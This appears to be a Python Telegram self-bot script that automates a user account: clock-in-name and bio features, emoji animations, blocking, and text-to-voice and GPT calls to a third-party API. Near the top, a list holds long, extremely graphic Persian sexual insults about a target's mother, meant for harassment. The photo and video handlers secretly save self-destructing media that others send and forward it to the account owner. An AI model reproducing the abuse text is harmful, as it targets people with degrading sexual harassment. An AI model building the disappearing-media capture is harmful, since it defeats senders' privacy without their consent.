# ==============================
# 📬 Telegram: @Abolfazl_rwm — ⚠️ استفاده، ویرایش و بازنشر فقط با ذکر منبع مجاز است؛ حذف این اعتبار اجازه نمی‌شود.
# Use, edit and redistribute only with attribution to @Abolfazl_rwm.
# ==============================

from apscheduler.schedulers.asyncio import AsyncIOScheduler
from pyrogram.errors import PhotoCropSizeSmall
from pyrogram import Client, filters , enums , emoji
from urllib.parse import quote
from datetime import datetime
from pytube import YouTube
import reloads
from importlib import reload
import unicodedata
import pyrogram
import requests
import importlib
import shutil
import random
import pytz
import time
import json
import os


api_id = 
api_hash = ""
bot = Client("my_account", api_id=api_id, api_hash=api_hash)
admin = 'me'

fonts = {
    'Font1' : { '0': '𝟎','1': '𝟏','2': '𝟐','3': '𝟑','4': '𝟒','5': '𝟓','6': '𝟔','7': '𝟕','8': '𝟖','9': '𝟗' },
    'Font2' : { '0': '𝟘','1': '𝟙','2': '𝟚','3': '𝟛','4': '𝟜','5': '𝟝','6': '𝟞','7': '𝟟','8': '𝟠','9': '𝟡' },
    'Font3' : { '0': '⓪','1': '①','2': '②','3': '③','4': '④','5': '⑤','6': '⑥','7': '⑦','8': '⑧','9': '⑨' },
    'Font4' : { '0': '⁰','1': '¹','2': '²','3': '³','4': '⁴','5': '⁵','6': '⁶','7': '⁷','8': '⁸','9': '⁹' },
}

FoshList = [
    'کیرم تو رحم اجاره ای و خونی مالی مادرت حاضرم',
    ' دو میلیون شبی پول ویلا بدم تا مادرتو تو گوشه کناراش بگام و اب کوسشو بریزم کف خونه تا فردا صبح کارگرای افغانی برای نظافت اومدن با بوی اب کس مادرت بجقن و ابکیراشون نثار قبر مرده هات بشه',
    'آخه احمق مادر کونی من کس مادرت گذاشتم تو بازم داری کسشر میگی',
    ' کیرم تا تخمدانش تو کس مادرت بی سطح خار کسه انقدسرعتت پایینه خستم کردی کیرمو جاساز کردم تو کس چرب مادرت به قول والدفری ک الان قیافشو یادم نمیاد میگفت هر شمشیر یه قلاف میخواد ولی قافل از این ک کیر من مثل گرز رستمه و کس مادرت مثل قلاف چاقو دستی پس کیر تو ناموست ',
    'قراره به مادرت به سهمگین ترین شکل ممکن تجاوز کنم و توی فاحشه ی نتی و هرزه ی متصل به اینترنت جهانی و بین الملل بیای توی اپلیکیشن تلگرام بگی نخوندم',
    'مرسی فک میکنی میخونم این اراجیف خزتو احمق مادر جنده من مادرتو دارم میکشم تو واسه من پنج خط تکس پر می‌کنی خز ممبر دوساعتع رو تایپی این کسشرا چیه میگی آخه کیرم تو سطح گوهت',
    'وقتی کیرمو نشون مادرت دادم سوار پراید ۷۹ شد و باهاش شبانه روز تاخت تا کیلومتر ها از من دور بشه ولی قافل از این بود ک من سوار سوزوکی ۱۰۰۰ بودم و تا روز قیامت مادرتو تعقیب کردم ریدم پراید هفتاد نه سکو با لانچیکو بزنی سوار پراید ۸۲ نمیشه احمق با پراید مدل ۷۹ میرم تو کس ننت تا مثل یه ماشین زمان عمل کنه',
    'اتحادی خر ممبر این اراجیف چیه می‌نویسی آخه کیرم تو ناموس پاموست با زبون مثل موتور برقم میافتم به کس مادرت و لیسای عمیق میزنم و اب کوسشو را میندازم ',
    'ببین مادرت که اینجاس ببینم زبون درازی میکنم همین الان از کس دارش میزنم تگ مگ چیه خارکسته ی ولد موش حاصل زنای خرس گریزلی با مادرت مگه مثل توی مادر پیچ گوشتی داگ اتحادیم سگ افغان با اسم گوه و کمترین داشته های زندگی و بی همه چیز بودن کیر تو همه کست همه کس کونی تو دوساعت باقی‌موندش سینه های گوشتالوی ',
    'مادرتو میگیرم تو دستمو میمالم و دهنمو چفت کوس مادرت میکنم و مثل همیشه و مثل یه لیسر قهار زبون میندازم به چوچول سیاه مادرت و یکاری میکنم صدای اه و نالش کل ۷ اسمونو برداره ',
    'ای کس ننت مادر جنده که انقد خری که داری از خایه هام بالامیری مادر جنده کیرم به پهنا تو کس مادرت دارم با کس ننت بازی میکنم تو داری جق میزنی با پورنایی که از مادرت فرسادم واست بیناموس کیرم تو ناموست فیلم ابد و یک روز بره تو کس ننه ی هرکی تماشاش کرده خارکسته فقط بنرشو یبار تو سینما دیدم مادر خر مگ مثل توی کسته ناموس خزم برم فیلمای گوه ایرانیارو نیگا کنم مادر سکسچتر کفتر مادر کلاغ بیاد نوک بزنه تو کس ننت مادرکسته میدونم جلوی تکسام داری کم میاری و به پته پته افتادی ولی گوه تو کس ناموست من دست بردار نیستم و امپولای ادمای انسولینی رو میکنم تو کس ننتآخه کس ننت گذاشتم که انقد فشاری شدی واسه من ده خط پر می‌کنی اتحادی خر ممبر کس ننتو گاییدم بعد شروع میکنی کسشر گفتن مثل شکلاتای فرمند که دو رنگن با مادرت ترکیب میشم و میدم پدر بی غیرتت بخوره خارکسته پول نداری چیه مادر خر اندازه حقوق یه ماه بابای کارگر فقیرت فقط خرج شورت و سوتینای مادرت میکنم ک موقع سکس هرشب پارشون میکنم و به خورد مادرت میدم ببین بابات انقد بی غیرته که داره اینجا با کس ننت ور می‌ره من دارم فیلم میگیرم دست از سر خایه هام بردار کسکش پدر خدازده بی ابرو سیک کن دلقک با اون ایموجی خز که یه مش بچ سال عنشو دراوردن اتحادی چیه خارکسته به مادرت غذا نمیدم تا قند مغزش بیاد پایین و جوش بیاره و همین ک عصبانی شد کیرمو بکنم تک دهنش تا خفه خون بگیدخ اموجی تو کص ننت رفته مقدس شده واسم پسر کونی نهایت ۱۶ سالن باشه نبینم واسه من قد علم کنی که کس مادرتو با همین چاقو اینجا پاره میکنم کس ننت بگیدخ چیه لرز چیه داش وقتی میترسی مادرت راحت تر کسش باز میشه کیرمو میکنم تو کس ناموست و با رمز عملیاتی ک الان تو خاطرم نیست به مادرت یورش میبرم خر مادر تا اعتراف نکنی مادرت به اعماق اقیانوس ارام پیوسته دست از سر کچل بابای بی غیرتت برنمیدارم آخه کیرم تو سطح کوهت سر ناموست شرط بستم مادر جنده کس ننت کیرم تو ناموست مادربَرده خسته نمیشی اتقد دلقک بازی درمیاری کودکستانی خارکسته ترس مرس تو کارم نیست و مثل یه شیر میافتم به جون پستونای بلوری مادرت و میمیکم و میمیکم ابکیرمو خالی میکنم رو سنگ قبر مشکی بابای خدابیامرزت مادرت پورن استاره میدونستی؟ زشته انقد بی غیرتی جای این که از زیر پل جمعش کنی نشستی با فحاشی های بچه سالانه صورت مسعله رو پاک میکنی خارکسته اینجا حق بت زدن نداری کجکی ناموس پوسته گوجه ناموس میرم تو کسه مادرت درم نمیبندم کیرم تو خار مادرت مادر جنده من کس ننتو دارم با اشتهای کاذب میخورم تو داری به کس ننت میخندی کیرم تو رحم اجاره ای و خونی مالی مادرت حاضرم دو میلیون شبی پول ویلا بدم تا مادرتو تو گوشه کناراش بگام و اب کوسشو بریزم کف خونه'
]

if not os.path.isdir("data"):
    os.makedirs("data")

    with open("data/TimeName.txt", "w") as file1:
        file1.write("off")

    with open("data/TimeBio.txt", "w") as file2:
        file2.write("off")
    with open("data/Font.txt", "w") as file2:
        file2.write("Font1")

    with open("data/italic.txt", "w") as file2:
        file2.write("off")

    with open("data/part.txt", "w") as file2:
        file2.write("off")

    with open("data/bold.txt", "w") as file2:
        file2.write("off")

    with open("data/link.txt", "w") as file2:
        file2.write("off")

    with open("data/underline.txt", "w") as file2:
        file2.write("off")

    os.makedirs("data/action")

    with open("data/action/playing.txt", "w") as file2:
        file2.write("off")

    with open("data/action/typing.txt", "w") as file2:
        file2.write("off")

    with open("data/action/RECORD_VIDEO.txt", "w") as file2:
        file2.write("off")

    with open("data/action/CHOOSE_STICKER.txt", "w") as file2:
        file2.write("off")

    with open("data/action/UPLOAD_VIDEO.txt", "w") as file2:
        file2.write("off")

    with open("data/action/UPLOAD_DOCUMENT.txt", "w") as file2:
        file2.write("off")

    with open("data/action/UPLOAD_AUDIO.txt", "w") as file2:
        file2.write("off")

    with open("data/action/SPEAKING.txt", "w") as file2:
        file2.write("off")


@bot.on_message(pyrogram.filters.photo)
async def onphoto( client,message) :
    try :
        await bot.send_chat_action(chat_id=message.chat.id , action=enums.ChatAction.SPEAKING)
        if message.photo.ttl_seconds :
            rand = random.randint(1000, 9999999)
            local = f"downloads/photo-{rand}.png"
            await bot.download_media(message=message.photo.file_id, file_name=f"photo-{rand}.png")
            await bot.send_photo(chat_id=admin, photo=local, caption=f"🔥 New timed image {message.photo.date} | time: {message.photo.ttl_seconds}s")
            os.remove(local)
            
    except :
        pass


@bot.on_message(pyrogram.filters.video)
async def onvideo(client, message) :
    try :
        if message.video.ttl_seconds :
            rand = random.randint(1000, 9999999)
            local = f"downloads/video-{rand}.mp4"
            await bot.download_media(message=message.video.file_id, file_name=f"video-{rand}.mp4")
            await bot.send_video(chat_id=admin, video=local, caption=f"🔥 New timed video {message.video.date} | time: {message.video.ttl_seconds}s")
            os.remove(local)
    except :
        pass


async def TimeName():
    with open("data/TimeName.txt", "r") as file:
        TimeName = file.read()
    if TimeName == "on" :
        tz = pytz.timezone("Asia/Tehran")
        now = datetime.now(tz)
        if ( now.strftime("%S") == "00") :

            number = now.strftime("%H:%M")
            with open("data/Font.txt", "r") as file2:
                FONT = file2.read()
            if FONT == "Random":
                
                try:
                    selected_font = random.choice(list(fonts.keys()))
                    tz = pytz.timezone("Asia/Tehran")
                    now = datetime.now(tz)
                    current_time = now.strftime("%H:%M")

                    converted_time = ''.join([fonts[selected_font].get(char, char) for char in current_time])

                    await bot.update_profile(last_name=converted_time)
                except :
                    pass
            else:
                number_unicode = ''.join([fonts[FONT][c] if c in fonts[FONT] else c for c in str(number)])
                await bot.update_profile(last_name=number_unicode)


async def TimeBio():
    with open("data/TimeBio.txt", "r") as file:
        TimeBio = file.read()
    if TimeBio == "on" :
        tz = pytz.timezone("Asia/Tehran")
        now = datetime.now(tz)
        if ( now.strftime("%S") == "00") :

            number = now.strftime("%H:%M")
            with open("data/Font.txt", "r") as file2:
                FONT = file2.read()
            if FONT == "Random":
                
                try:
                    selected_font = random.choice(list(fonts.keys()))
                    tz = pytz.timezone("Asia/Tehran")
                    now = datetime.now(tz)
                    current_time = now.strftime("%H:%M")

                    converted_time = ''.join([fonts[selected_font].get(char, char) for char in current_time])
                except :
                    pass
                await bot.update_profile(bio="Time Now : "+converted_time)


            else:
                number_unicode = ''.join([fonts[FONT][c] if c in fonts[FONT] else c for c in str(number)])
                await bot.update_profile(bio="Time Now : "+number_unicode)



scheduler = AsyncIOScheduler()
scheduler.add_job(TimeName, "interval", seconds=1)
scheduler.add_job(TimeBio, "interval", seconds=1)


@bot.on_message(filters.user(admin))
async def admins(client , message):
    text = message.text
    from_id = message.chat.id
    if not os.path.isdir(f"data/{admin}"):
        os.makedirs(f"data/{admin}")
        profileBio = await bot.invoke(pyrogram.raw.functions.users.GetFullUser(id=await bot.resolve_peer(admin)))

        Name = message.from_user.first_name
        ProfilePhoto = message.from_user.photo.big_file_id
        with open(f"data/{admin}/bio.txt", "w" , encoding="utf-8") as file2:
            file2.write(profileBio.full_user.about)

        with open(f"data/{admin}/name.txt", "w" , encoding="utf-8") as file1:
            file1.write(Name)

        local = f"data/{admin}/profile.png"
        await bot.download_media(message=ProfilePhoto, file_name=local)

    if message.text == "TimeName on":
        with open("data/TimeName.txt", "w") as file:
            file.write("on")
        await bot.edit_message_text(chat_id=message.chat.id , text='TimeName is on' , message_id=message.id)

    if message.text == "TimeName off":
        with open("data/TimeName.txt", "w") as file:
            file.write("off")
        await bot.edit_message_text(chat_id=message.chat.id , text='TimeName is off' , message_id=message.id)


    if message.text == "TimeBio on":
        with open("data/TimeBio.txt", "w") as file:
            file.write("on")
        await bot.edit_message_text(chat_id=message.chat.id , text='TimeBio is on' , message_id=message.id)

    if message.text == "TimeBio off":
        with open("data/TimeBio.txt", "w") as file:
            file.write("off")
        await bot.edit_message_text(chat_id=message.chat.id , text='TimeBio is off' , message_id=message.id)



    if message.text == "italic on":
        with open("data/italic.txt", "w") as file:
            file.write("on")
        await bot.edit_message_text(chat_id=message.chat.id , text='italic is on' , message_id=message.id)

    if message.text == "italic off":
        with open("data/italic.txt", "w") as file:
            file.write("off")
        await bot.edit_message_text(chat_id=message.chat.id , text='italic is off' , message_id=message.id)

    if message.text == "part on":
        with open("data/part.txt", "w") as file:
            file.write("on")
        await bot.edit_message_text(chat_id=message.chat.id , text='part is on' , message_id=message.id)

    if message.text == "part off":
        with open("data/part.txt", "w") as file:
            file.write("off")
        await bot.edit_message_text(chat_id=message.chat.id , text='part is off' , message_id=message.id)


    if message.text == "bold on":
        with open("data/bold.txt", "w") as file:
            file.write("on")
        await bot.edit_message_text(chat_id=message.chat.id , text='bold is on' , message_id=message.id)

    if message.text == "bold off":
        with open("data/bold.txt", "w") as file:
            file.write("off")
        await bot.edit_message_text(chat_id=message.chat.id , text='bold is off' , message_id=message.id)

    if message.text == "link on":
        with open("data/link.txt", "w") as file:
            file.write("on")
        await bot.edit_message_text(chat_id=message.chat.id , text='link is on' , message_id=message.id)

    if message.text == "link off":
        with open("data/link.txt", "w") as file:
            file.write("off")
        await bot.edit_message_text(chat_id=message.chat.id , text='link is off' , message_id=message.id)

    if message.text == "underline on":
        with open("data/underline.txt", "w") as file:
            file.write("on")
        await bot.edit_message_text(chat_id=message.chat.id , text='underline is on' , message_id=message.id)

    if message.text == "underline off":
        with open("data/underline.txt", "w") as file:
            file.write("off")
        await bot.edit_message_text(chat_id=message.chat.id , text='underline is off' , message_id=message.id)

    if message.text == "playing on":
        with open("data/action/playing.txt", "w") as file:
            file.write("on")
        await bot.edit_message_text(chat_id=message.chat.id , text='playing action is on' , message_id=message.id)

    if message.text == "playing off":
        with open("data/action/playing.txt", "w") as file:
            file.write("off")
        await bot.edit_message_text(chat_id=message.chat.id , text='playing action is off' , message_id=message.id)

    if message.text == "typing on":
        with open("data/action/typing.txt", "w") as file:
            file.write("on")
        await bot.edit_message_text(chat_id=message.chat.id , text='typing action is on' , message_id=message.id)

    if message.text == "typing off":
        with open("data/action/typing.txt", "w") as file:
            file.write("off")
        await bot.edit_message_text(chat_id=message.chat.id , text='typing action is off' , message_id=message.id)

    if message.text == "RECORD_VIDEO on":
        with open("data/action/RECORD_VIDEO.txt", "w") as file:
            file.write("on")
        await bot.edit_message_text(chat_id=message.chat.id , text='RECORD_VIDEO action is on' , message_id=message.id)

    if message.text == "RECORD_VIDEO off":
        with open("data/action/RECORD_VIDEO.txt", "w") as file:
            file.write("off")
        await bot.edit_message_text(chat_id=message.chat.id , text='RECORD_VIDEO action is off' , message_id=message.id)

    if message.text == "CHOOSE_STICKER on":
        with open("data/action/CHOOSE_STICKER.txt", "w") as file:
            file.write("on")
        await bot.edit_message_text(chat_id=message.chat.id , text='CHOOSE_STICKER action is on' , message_id=message.id)

    if message.text == "CHOOSE_STICKER off":
        with open("data/action/CHOOSE_STICKER.txt", "w") as file:
            file.write("off")
        await bot.edit_message_text(chat_id=message.chat.id , text='CHOOSE_STICKER action is off' , message_id=message.id)

    if message.text == "UPLOAD_VIDEO on":
        with open("data/action/UPLOAD_VIDEO.txt", "w") as file:
            file.write("on")
        await bot.edit_message_text(chat_id=message.chat.id , text='UPLOAD_VIDEO action is on' , message_id=message.id)

    if message.text == "UPLOAD_VIDEO off":
        with open("data/action/UPLOAD_VIDEO.txt", "w") as file:
            file.write("off")
        await bot.edit_message_text(chat_id=message.chat.id , text='UPLOAD_VIDEO action is off' , message_id=message.id)

    if message.text == "UPLOAD_DOCUMENT on":
        with open("data/action/UPLOAD_DOCUMENT.txt", "w") as file:
            file.write("on")
        await bot.edit_message_text(chat_id=message.chat.id , text='UPLOAD_DOCUMENT action is on' , message_id=message.id)

    if message.text == "UPLOAD_DOCUMENT off":
        with open("data/action/UPLOAD_DOCUMENT.txt", "w") as file:
            file.write("off")
        await bot.edit_message_text(chat_id=message.chat.id , text='UPLOAD_DOCUMENT action is off' , message_id=message.id)

    if message.text == "UPLOAD_AUDIO on":
        with open("data/action/UPLOAD_AUDIO.txt", "w") as file:
            file.write("on")
        await bot.edit_message_text(chat_id=message.chat.id , text='UPLOAD_AUDIO action is on' , message_id=message.id)

    if message.text == "UPLOAD_AUDIO off":
        with open("data/action/UPLOAD_AUDIO.txt", "w") as file:
            file.write("off")
        await bot.edit_message_text(chat_id=message.chat.id , text='UPLOAD_AUDIO action is off' , message_id=message.id)

    if message.text == "SPEAKING on":
        with open("data/action/SPEAKING.txt", "w") as file:
            file.write("on")
        await bot.edit_message_text(chat_id=message.chat.id , text='SPEAKING action is on' , message_id=message.id)

    if message.text == "SPEAKING off":
        with open("data/action/SPEAKING.txt", "w") as file:
            file.write("off")
        await bot.edit_message_text(chat_id=message.chat.id , text='SPEAKING action is off' , message_id=message.id)



    if 'SetFont ' in str(message.text):
            try:
                if message.text == "SetFont 1":
                    with open("data/Font.txt", "w") as file2:
                        file2.write("Font1")
                    await bot.edit_message_text(chat_id=message.chat.id , text='The Font1 is Seted' , message_id=message.id)
                
                elif message.text == "SetFont 2":
                    with open("data/Font.txt", "w") as file2:
                        file2.write("Font2")
                    await bot.edit_message_text(chat_id=message.chat.id , text='The Font2 is Seted' , message_id=message.id)
                
                elif message.text == "SetFont 3":
                    with open("data/Font.txt", "w") as file2:
                        file2.write("Font3")
                    await bot.edit_message_text(chat_id=message.chat.id , text='The Font3 is Seted' , message_id=message.id)
                
                elif message.text == "SetFont 4":
                    with open("data/Font.txt", "w") as file2:
                        file2.write("Font4")
                    await bot.edit_message_text(chat_id=message.chat.id , text='The Font4 is Seted' , message_id=message.id)
                
                elif message.text == "SetFont Random":
                    with open("data/Font.txt", "w") as file2:
                        file2.write("Random")
                    await bot.edit_message_text(chat_id=message.chat.id , text='The Font Random is Seted' , message_id=message.id)
            except:
                pass

    if message.text == "مربع":
        await bot.edit_message_text(chat_id=message.chat.id , text="""
◼️◼️◼️◼️◼️
◼️◼️◼️◼️◼️
◼️◼️◼️◼️◼️
◼️◼️◼️◼️◼️
◼️◼️◼️◼️◼️
                                """ , message_id=message.id)
        
        await bot.edit_message_text(chat_id=message.chat.id , text="""
◻️◼️◼️◼️◼️
◼️◼️◼️◼️◼️
◼️◼️◼️◼️◼️
◼️◼️◼️◼️◼️
◼️◼️◼️◼️◼️
                                """ , message_id=message.id)
        
        await bot.edit_message_text(chat_id=message.chat.id , text="""
◻️◻️◼️◼️◼️
◼️◼️◼️◼️◼️
◼️◼️◼️◼️◼️
◼️◼️◼️◼️◼️
◼️◼️◼️◼️◼️
                                """ , message_id=message.id)
        
        await bot.edit_message_text(chat_id=message.chat.id , text="""
◻️◻️◻️◼️◼️
◼️◼️◼️◼️◼️
◼️◼️◼️◼️◼️
◼️◼️◼️◼️◼️
◼️◼️◼️◼️◼️
                                """ , message_id=message.id)
        
        await bot.edit_message_text(chat_id=message.chat.id , text="""
◻️◻️◻️◻️◼️
◼️◼️◼️◼️◼️
◼️◼️◼️◼️◼️
◼️◼️◼️◼️◼️
◼️◼️◼️◼️◼️
                                """ , message_id=message.id)
        
        await bot.edit_message_text(chat_id=message.chat.id , text="""
◻️◻️◻️◻️◻️
◼️◼️◼️◼️◼️
◼️◼️◼️◼️◼️
◼️◼️◼️◼️◼️
◼️◼️◼️◼️◼️
                                """ , message_id=message.id)
        
        await bot.edit_message_text(chat_id=message.chat.id , text="""
◻️◻️◻️◻️◻️
◻️◼️◼️◼️◼️
◼️◼️◼️◼️◼️
◼️◼️◼️◼️◼️
◼️◼️◼️◼️◼️
                                """ , message_id=message.id)
        
        await bot.edit_message_text(chat_id=message.chat.id , text="""
◻️◻️◻️◻️◻️
◻️◻️◼️◼️◼️
◼️◼️◼️◼️◼️
◼️◼️◼️◼️◼️
◼️◼️◼️◼️◼️
                                """ , message_id=message.id)
        
        await bot.edit_message_text(chat_id=message.chat.id , text="""
◻️◻️◻️◻️◻️
◻️◻️◻️◼️◼️
◼️◼️◼️◼️◼️
◼️◼️◼️◼️◼️
◼️◼️◼️◼️◼️
                                """ , message_id=message.id)
        
        await bot.edit_message_text(chat_id=message.chat.id , text="""
◻️◻️◻️◻️◻️
◻️◻️◻️◻️◼️
◼️◼️◼️◼️◼️
◼️◼️◼️◼️◼️
◼️◼️◼️◼️◼️
                                """ , message_id=message.id)
        
        await bot.edit_message_text(chat_id=message.chat.id , text="""
◻️◻️◻️◻️◻️
◻️◻️◻️◻️◻️
◼️◼️◼️◼️◼️
◼️◼️◼️◼️◼️
◼️◼️◼️◼️◼️
                                """ , message_id=message.id)
        
        await bot.edit_message_text(chat_id=message.chat.id , text="""
◻️◻️◻️◻️◻️
◻️◻️◻️◻️◻️
◻️◼️◼️◼️◼️
◼️◼️◼️◼️◼️
◼️◼️◼️◼️◼️
                                """ , message_id=message.id)
        
        await bot.edit_message_text(chat_id=message.chat.id , text="""
◻️◻️◻️◻️◻️
◻️◻️◻️◻️◻️
◻️◻️◼️◼️◼️
◼️◼️◼️◼️◼️
◼️◼️◼️◼️◼️
                                """ , message_id=message.id)
        
        await bot.edit_message_text(chat_id=message.chat.id , text="""
◻️◻️◻️◻️◻️
◻️◻️◻️◻️◻️
◻️◻️◻️◼️◼️
◼️◼️◼️◼️◼️
◼️◼️◼️◼️◼️
                                """ , message_id=message.id)
        
        await bot.edit_message_text(chat_id=message.chat.id , text="""
◻️◻️◻️◻️◻️
◻️◻️◻️◻️◻️
◻️◻️◻️◻️◼️
◼️◼️◼️◼️◼️
◼️◼️◼️◼️◼️
                                """ , message_id=message.id)
        
        await bot.edit_message_text(chat_id=message.chat.id , text="""
◻️◻️◻️◻️◻️
◻️◻️◻️◻️◻️
◻️◻️◻️◻️◻️
◼️◼️◼️◼️◼️
◼️◼️◼️◼️◼️
                                """ , message_id=message.id)
        
        
        await bot.edit_message_text(chat_id=message.chat.id , text="""
◻️◻️◻️◻️◻️
◻️◻️◻️◻️◻️
◻️◻️◻️◻️◻️
◻️◼️◼️◼️◼️
◼️◼️◼️◼️◼️
                                """ , message_id=message.id)
        
        
        await bot.edit_message_text(chat_id=message.chat.id , text="""
◻️◻️◻️◻️◻️
◻️◻️◻️◻️◻️
◻️◻️◻️◻️◻️
◻️◻️◼️◼️◼️
◼️◼️◼️◼️◼️
                                """ , message_id=message.id)
        
        
        await bot.edit_message_text(chat_id=message.chat.id , text="""
◻️◻️◻️◻️◻️
◻️◻️◻️◻️◻️
◻️◻️◻️◻️◻️
◻️◻️◻️◼️◼️
◼️◼️◼️◼️◼️
                                """ , message_id=message.id)
        
        
        await bot.edit_message_text(chat_id=message.chat.id , text="""
◻️◻️◻️◻️◻️
◻️◻️◻️◻️◻️
◻️◻️◻️◻️◻️
◻️◻️◻️◻️◼️
◼️◼️◼️◼️◼️
                                """ , message_id=message.id)
        
        
        await bot.edit_message_text(chat_id=message.chat.id , text="""
◻️◻️◻️◻️◻️
◻️◻️◻️◻️◻️
◻️◻️◻️◻️◻️
◻️◻️◻️◻️◻️
◼️◼️◼️◼️◼️
                                """ , message_id=message.id)
        
        await bot.edit_message_text(chat_id=message.chat.id , text="""
◻️◻️◻️◻️◻️
◻️◻️◻️◻️◻️
◻️◻️◻️◻️◻️
◻️◻️◻️◻️◻️
◻️◼️◼️◼️◼️
                                """ , message_id=message.id)
        
        await bot.edit_message_text(chat_id=message.chat.id , text="""
◻️◻️◻️◻️◻️
◻️◻️◻️◻️◻️
◻️◻️◻️◻️◻️
◻️◻️◻️◻️◻️
◻️◻️◼️◼️◼️
                                """ , message_id=message.id)
        
        await bot.edit_message_text(chat_id=message.chat.id , text="""
◻️◻️◻️◻️◻️
◻️◻️◻️◻️◻️
◻️◻️◻️◻️◻️
◻️◻️◻️◻️◻️
◻️◻️◻️◼️◼️
                                """ , message_id=message.id)
        
        await bot.edit_message_text(chat_id=message.chat.id , text="""
◻️◻️◻️◻️◻️
◻️◻️◻️◻️◻️
◻️◻️◻️◻️◻️
◻️◻️◻️◻️◻️
◻️◻️◻️◻️◼️
                                """ , message_id=message.id)
        
        await bot.edit_message_text(chat_id=message.chat.id , text="""
◻️◻️◻️◻️◻️
◻️◻️◻️◻️◻️
◻️◻️◻️◻️◻️
◻️◻️◻️◻️◻️
◻️◻️◻️◻️◻️
                                """ , message_id=message.id)
        
        time.sleep(0.5)

        await bot.edit_message_text(chat_id=message.chat.id , text="تمام" , message_id=message.id)

    if message.text == "قلب":
        await bot.edit_message_text(chat_id=message.chat.id , text="❤️" , message_id=message.id)
        await bot.edit_message_text(chat_id=message.chat.id , text="🧡" , message_id=message.id)
        await bot.edit_message_text(chat_id=message.chat.id , text="💛" , message_id=message.id)
        await bot.edit_message_text(chat_id=message.chat.id , text="💚" , message_id=message.id)
        await bot.edit_message_text(chat_id=message.chat.id , text="💙" , message_id=message.id)
        await bot.edit_message_text(chat_id=message.chat.id , text="💜" , message_id=message.id)
        await bot.edit_message_text(chat_id=message.chat.id , text="🖤" , message_id=message.id)
        await bot.edit_message_text(chat_id=message.chat.id , text="🤎" , message_id=message.id)
        await bot.edit_message_text(chat_id=message.chat.id , text="❤️‍🔥" , message_id=message.id)
        await bot.edit_message_text(chat_id=message.chat.id , text="❤️‍🩹" , message_id=message.id)
        await bot.edit_message_text(chat_id=message.chat.id , text="❣️" , message_id=message.id)
        await bot.edit_message_text(chat_id=message.chat.id , text="💓" , message_id=message.id)
        await bot.edit_message_text(chat_id=message.chat.id , text="💗" , message_id=message.id)
        await bot.edit_message_text(chat_id=message.chat.id , text="❤️" , message_id=message.id)
        await bot.edit_message_text(chat_id=message.chat.id , text="🧡" , message_id=message.id)
        await bot.edit_message_text(chat_id=message.chat.id , text="💛" , message_id=message.id)
        await bot.edit_message_text(chat_id=message.chat.id , text="💚" , message_id=message.id)
        await bot.edit_message_text(chat_id=message.chat.id , text="💙" , message_id=message.id)
        await bot.edit_message_text(chat_id=message.chat.id , text="💜" , message_id=message.id)
        await bot.edit_message_text(chat_id=message.chat.id , text="🖤" , message_id=message.id)
        await bot.edit_message_text(chat_id=message.chat.id , text="🤎" , message_id=message.id)
        await bot.edit_message_text(chat_id=message.chat.id , text="❤️‍🔥" , message_id=message.id)
        await bot.edit_message_text(chat_id=message.chat.id , text="❤️‍🩹" , message_id=message.id)
        await bot.edit_message_text(chat_id=message.chat.id , text="❣️" , message_id=message.id)
        await bot.edit_message_text(chat_id=message.chat.id , text="💓" , message_id=message.id)
        await bot.edit_message_text(chat_id=message.chat.id , text="💗" , message_id=message.id)


    if message.text == "bot" or message.text == "ربات":
        await bot.send_message(chat_id=message.chat.id , text= "Self is on" , reply_to_message_id=message.id)

    if message.text == "Block":
        await bot.edit_message_text(chat_id=message.chat.id , text="User Blocked" , message_id=message.id)
        await bot.block_user(user_id=message.chat.id)
        await bot.block_user(user_id=message.reply_to_message.from_user.id)

    if message.text == "UnBlock":
        # await bot.unblock_user(user_id=)
        await bot.edit_message_text(chat_id=message.chat.id , text="User UnBlocked" , message_id=message.id)
        await bot.unblock_user(user_id=message.reply_to_message.from_user.id)
        await bot.unblock_user(user_id=message.chat.id)

    if "ویس " in str(message.text) :
        result = message.text.split("ویس ")
        text = result[1]

        url = f"https://haji-api.ir/text-to-voice/?text={text}&Character=DilaraNeural"
        response = requests.get(url)  

        if response.status_code == 200:  
            content = response.content  

            try:
                data = json.loads(content) 
                url_from_json = data['results']['url']  
                await bot.send_voice(chat_id=message.chat.id ,voice=url_from_json , reply_to_message_id=message.id )
            except json.JSONDecodeError:
                await bot.send_message(chat_id=message.chat.id , text="خطا در دیکد وب سرویس" , reply_to_message_id=message.id)
        else:
            await bot.send_message(chat_id=message.chat.id ,text="خطا در اتصال به وب سرویس" , reply_to_message_id=message.id)

    if message.text == "SetName":
        names = message.reply_to_message.text
        await bot.update_profile(first_name=names)
        await bot.edit_message_text(chat_id=message.chat.id , text=f"The Name : [ {names} ] is Seted" , message_id=message.id)
    
    if message.text == "SetBio":
        Bios = message.reply_to_message.text
        await bot.update_profile(bio=Bios)
        await bot.edit_message_text(chat_id=message.chat.id , text=f"The Bio : [ {Bios} ] is Seted" , message_id=message.id)


    if message.text == "SetProfile":
        pm = message.reply_to_message
        if pm.photo:
            await bot.edit_message_text(chat_id=message.chat.id , text=f"Whate . . ." , message_id=message.id)
            try:
                rand = random.randint(1000, 9999999)
                local = f"downloads/photo-{rand}.jpg"
                await bot.download_media(message=pm.photo.file_id, file_name=f"photo-{rand}.jpg")
                await bot.set_profile_photo(photo=f"downloads/photo-{rand}.jpg")
                await bot.edit_message_text(chat_id=message.chat.id , text=f"Photo Is Seted" , message_id=message.id)
                os.remove(local)
            except PhotoCropSizeSmall:
                await bot.edit_message_text(chat_id=message.chat.id , text=f"Photo Is Small" , message_id=message.id)
                os.remove(local)


        elif pm.video:
            await bot.edit_message_text(chat_id=message.chat.id , text=f"Whate . . ." , message_id=message.id)
            rand = random.randint(1000, 9999999)
            local = f"downloads/Video-{rand}.mp4"
            await bot.download_media(message=pm.video.file_id, file_name=f"Video-{rand}.mp4")
            await bot.set_profile_photo(video=local)
            await bot.edit_message_text(chat_id=message.chat.id , text=f"Video Is Seted" , message_id=message.id)
            os.remove(local)

        else:
            await bot.edit_message_text(chat_id=message.chat.id , text=f"Not Photo or Video" , message_id=message.id)

    if "gpt " in str(message.text) : 
        result = message.text.split("gpt ")
        text = result[1]

        url = f"https://haji-api.ir/Free-GPT3/?text={text}"
        response = requests.get(url)  

        if response.status_code == 200:  
            content = response.content  

            try:
                data = json.loads(content) 
                answer = data['result']['answer']  
                await bot.send_message(chat_id=message.chat.id , text=answer , reply_to_message_id=message.id)
            except json.JSONDecodeError:
                await bot.send_message(chat_id=message.chat.id , text="خطا در دیکد وب سرویس" , reply_to_message_id=message.id)
        else:
            await bot.send_message(chat_id=message.chat.id ,text="خطا در اتصال به وب سرویس" , reply_to_message_id=message.id)

